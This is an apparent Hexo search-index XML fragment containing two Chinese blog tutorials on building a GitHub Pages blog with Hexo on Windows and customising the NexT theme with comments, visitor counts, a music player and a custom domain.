修改以下部分这里我把about和公益404页面取消了，因为about我希望在侧栏中生成，404页面感觉也没啥用，代码还要自己写这里我是用mist主题，默认使用muse，果断mist好看啊这里挂社交链接，默认显示在侧栏，上面是链接，下面是图标，可以自己手动添加各种社交，例如微博，知乎。注意上下名字对应就行也就是上面是GitHub:xxxxx，下面也必须是GitHub:xxx,GitHub这个名称必须保持一致，区分大小写。把display修改为always，就是打开侧边栏 5. 进行头像设置在hexo/themes/next/source/images/下放置头像文件avatar.gif即可，记得把原来的avatar.gif删除。（jpg.png直接改后缀名成gif) 6. 引入第三方服务1. 添加文章评论功能登录多说,点击我要安装创建站点完成后在 站点配置文件（不是主题配置文件）中新增 duoshuo_shortname 字段，值设置成上一步中的值。duoshuo_shortname: xxxxx(xxxx为红色框内的内容)再打开themes/next/layout/_partials/comments.swig文件，找到原文件中的被替换代码：替换成如下代码 &lt;section id=&quot;comments&quot;&gt; &lt;!-- 多说评论框 start --&gt; &lt;div id=&quot;ds-thread&quot; class=&quot;ds-thread&quot; data-thread-key=&quot;{{ page.path }}&quot; data-title=&quot;{{ page.title }}&quot; data-url=&quot;{{ page.permalink }}&quot; }}&quot;&gt;&lt;/div&gt; &lt;!-- 多说评论框 end --&gt; &lt;!-- 多说公共JS代码 start (一个网页只需插入一次) --&gt; &lt;script type=&quot;text/javascript&quot;&gt; var duoshuoQuery = {short_name:&quot;shortTime&quot;}; (function() { var ds = document.createElement(&apos;script&apos;); ds.type = &apos;text/javascript&apos;;ds.async = true; ds.src = (document.location.protocol == &apos;https:&apos; ? &apos;https:&apos; : &apos;http:&apos;) + &apos;//static.duoshuo.com/embed.js&apos;; ds.charset = &apos;UTF-8&apos;; (document.getElementsByTagName(&apos;head&apos;)[0] || document.getElementsByTagName(&apos;body&apos;)[0]).appendChild(ds); })(); &lt;/script&gt; &lt;!-- 多说公共JS代码 end --&gt; &lt;/section&gt; 2. 添加分享功能同样在站点配置文件中加入duoshuo_share: true 3. 添加站点内容搜索 安装hexo-generator-searchdb打开bash输入以下命令$ npm install hexo-generator-searchdb --save 添加search字段 依旧打开站点配置文件,添加以下字段 search:path: search.xmlfield: postformat: htmllimit: 1004.在侧栏加入busuanzi访客统计功能打开hexo\themes\next\layout_macro下的sidebar.swig文件在macro render(is_post) %&#125;```下输入1```&lt;script async src=&quot;https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js&quot;&gt;&lt;/script&gt; 找到在下面输入123&lt;span id=&quot;busuanzi_container_site_uv&quot;&gt;&lt;b&gt;&lt;span id=&quot;busuanzi_value_site_uv&quot;&gt;&lt;/span&gt;&lt;/b&gt;&lt;br&gt;&lt;span class=&quot;site-state-item-name&quot;&gt;&#123;&#123; __(&apos;访客&apos;) &#125;&#125;&lt;/span&gt;&lt;/span&gt; 结果大致是这样的 7. 在侧栏输入个人简介&lt;br&gt; &lt;div align=&quot;left&quot; font-family: &quot;Arial&quot;,&quot;Microsoft YaHei&quot;,&quot;黑体&quot;,&quot;宋体&quot;,sans-serif&gt; &lt;b&gt;&lt;h1&gt;个人简介&lt;/h1&gt;&lt;/b&gt; &lt;p &gt;姓名：xxx&lt;br&gt; 性别：x&lt;br&gt; 星座：xxx&lt;br&gt; 爱好：xxxx&lt;br&gt; 主要奖项： xxx&lt;/p&gt; &lt;/div&gt; &lt;br&gt; 里面的东西当然自定义就好，代码输入位置参照下图 8. 设置你的网页logo选择一张照片在favicon在线制作制作成favicon.ico，最好选择32*32格式，然后复制到hexo\themes\next\source文件夹下即可 9. 设置页脚参照博客Hexo-Next底部powered by的logo栏更改以及注意事项（附官方文档,文末有福利链） 10. 设置音乐播放器外链首先进入网易云音乐选择一首歌，点进去后会有生成外链播放器复制代码(如果不希望自动播放可以点掉自动播放的勾) 在首页侧栏生成音乐播放器打开hexo\themes\next\layout_macro下的sidebar.swig找到在在下面粘贴从网易云复制下来的代码即可 在文章中生成音乐播放器可以生成一篇博客文章，然后把代码复制进去注意位置就可以。例如 至此基本的主题优化已经完成，后续优化请看我的下一篇博客用hexo搭建完博客后的后续SEO优化]]></content>
      <categories>
        <category>Hello World!</category>
      </categories>
      <tags>
        <tag>搭建博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[win下利用github pages+hexo搭建独立博客加next主题美化全盘详细教程(一)]]></title>
    <url>%2FHow-to-make-a-blog.html</url>
    <content type="text"><![CDATA[如何搭建一个独立博客——简明Github Pages与Hexo教程【超简单】Windows下使用GitHub + Hexo搭建技术博客 本文欢迎大家转载，转载请注明出处win下利用github pages+hexo搭建独立博客加next主题美化全盘详细教程(一)前言：第一次写博客有点激动，昨天利用了一天时间搭了自己的独立博客，虽说网上有不少大牛写的经验，但我因为中途换了不少教程也走了不少弯路，所以再次我想做个总结，写一个从创建github用户开始到主题优化的全面教程，其次我把所有用到的工具都用百度网盘的链接发出来，省去大家再去网上下载的麻烦。 简要介绍相对于wordpress用github pages的优势1 高逼格2 seo优化好3 用户300M的独立空间4 wp需要自己购买虚拟主机，低配一年也要将近200，github page完全免费5 github不怕被墙，就算被墙了也可以转回国内当然也有一些劣势，如没有强大的后台导致操作较复杂，访问速度相对较慢但总的来说还是github优势明显 附上效果图1 好了废话不多说，现在开始正题 1. 创建账号先去github官网上注册一个账号，根据提示最后一步别忘了激活你的邮箱 2. 创建仓库注册完后选择start a project创建仓库仓库分为两一种，一种是独立的一个账号只能注册一个，另外一种是挂在你的账号下的，这里我们选第一种所以我们在2区域输入xxx.github.io(xxx为1区域内的内容，名字固定且唯一，例如我是peelpeelfeng.github.io)然后点击生成 3. 安装github客户端百度网盘链接http://pan.baidu.com/s/1pLBB6sj 密码：62o3下载后运行Git-2.6.2-64-bit.exe进行安装一路默认到选择第二个可以在win下用cmd打开然后一路默认至完成安装 4. 配置SSH链右击桌面会出现git Bash Here 检查SSH的设置$ cd ~/. ssh 检查本机的ssh密钥 如果提示：No such file or directory 说明第一次使用。 生成新的SSH$ ssh-keygen -t rsa -C &quot;邮件地址&quot; Generating public/private rsa key pair. Enter file in which to save the key (/Users/your_user_directory/.ssh/id_rsa): 这里邮件地址填写你的邮箱地址，后面的回车默认就行系统会要求你输入连接密码。默认为空，按两次回车就行 Enter passphrase (empty for no passphrase): Enter same passphrase again: 添加SSH到Github服务器 打开目录找到刚才生成的id_rsa.pub文件，如果看不到请设置文件夹选项为显示隐藏文件，右键选择用notepad++打开（如果没有notepad++用记事本打开也行，以后都是）复制里面的所有内容(找不到的目录的右击桌面打开bash，标题上有目录） 打开github官网，点击右上角头像右边有个向下的小箭头，选择Settings–&gt;SSH and GPG keys–&gt;New SSH key 在key内粘贴刚才复制的SSH，title可以不填，点击ADD测试是否连接成功返回git bash，输入以下指令$ ssh -T git@github.com如果返回The authenticity of host ‘github.com (192.30.253.113)’ can’t be established.RSA key fingerprint is SHA256：xxxxxxxxxxxxxxxx.Are you sure you want to continue connecting (yes/no)?输入yes后回车 看到以下代码连接成功 Hi xxxxxx!5. 完善个人信息 12$ git config --global user.name &quot;xxxx&quot;//用户名$ git config --global user.email &quot;邮箱地址&quot;//填写自己的邮箱 github需要这些信息来记录提交信息。 进入hexo/找到__config.yml,右键用记事本或者notepad++打开，拉到最后找到deploy!进行如下配置注意type: 和repo: 后面有个空格不能省，以后凡是修改配置文件都要注意空格 6. 配置HexoHexo是一款强大，灵活的博客发布工具 安装node.js百度网盘链接 http://pan.baidu.com/s/1jILpjLk 密码：6zo3 安装Hexo打开git bash $ npm install -g hexo查看hexo版本信息 $ hexo -v 部署Hexo在我的电脑里任意位置建立一个[Hexo]文件夹，然后在此文件夹中右键打开git bash(这也是以后网站的本地目录) $ hexo initHexo随后会在这里自动部署建立网站所需要文件，然后执行以下两条命令 $ hexo g$ hexo s打开浏览器输入localhost:4000就能看到部署在本地的hexo默认主页了确认无误后用以下两条命令部署到远程服务器 $ hexo g #生成部署的相应文件夹$ hexo d #进行部署出现说明部署成功 注意以后每次需要上传文件或变更设置，都先用下面两条命令进行本地预览$ hexo clean #清除一下缓存$ hexo s #启动本地服务 再用下面两条命令进行部署$ hexo g$ hexo d 7. 绑定独立域名购买域名建议购买国外域名，国内域名政策繁琐推荐去godaddy购买,博主是一次性买了3年的170多，非土豪可以百度优惠码可以优惠 DNS设置在这里推荐在godaddy买的域名去dnspod注册个账号然后设置dns解析，因为godaddy国外反响挺好，国内有时候不是被墙就是快要被墙总之就是解析速度慢，dnspod的配置如下图网上有些教程会把记录值改为207.97.227.23x这是以前github的ip，请修正，另外ip可能会变动，具体请查看官网 godaddy上更改dns服务器登录godaddy,右上角小箭头选择我的产品–&gt;管理域名–&gt;管理域名服务器–&gt;选择定制–&gt;将godaddy的Nameservers更改成f1g1ns1.dnspod.net和f1g1ns2.dnspod.net 配置如下图 千万别手残去点什么网页转址，我当时就因为点了这个在里面绕了一个小时利用CNAME进行域名绑定在hexo/source文件夹里新建一个CNAME.txt文件，在文件里输入你的域名(例如peelpeelfeng.com)保存后删去后缀名然后利用bash进行上传$ hexo g$ hexo d 项目初始化本地创建一个文件夹为http://xxxx.github.io，右键git bash，键入以下命令(xxxx为你的账户名，如peelpeelfeng.github.io) echo “Hello World” &gt;&gt; README.mdgit initgit add README.mdgit commit -m “初始化”git remote add origin https://github.com/xxxx/xxxxx.github.io.gitgit push -u origin masterxxxx为你的账户名，最后一条指令敲完出现对话框，要求输入账号和密码，按照要求输入即可，这一步是为了实现关联，github默认第一次推送需要输入账号和密码，以后就可以直接在hexo根目录下进行推送 至此可用游览器访问你的域名进而访问你的博客主页了默认是这个样子要是404打不开网页的原因可能是网站没有index.html文件，没有CNAME文件,304就是重定向问题，查看一下你的DNS设置或者看看有没有手残点了GOdaddy的网页转址 恭喜独立博客算是搭建完成,后续优化请查看我的下一篇博客文章win下利用github pages+hexo搭建独立博客加next主题美化全盘详细教程(二)]]></content>
      <categories>
        <category>Hello World!</category>
      </categories>
      <tags>
        <tag>搭建博客</tag>
      </tags>
  </entry>
</search>
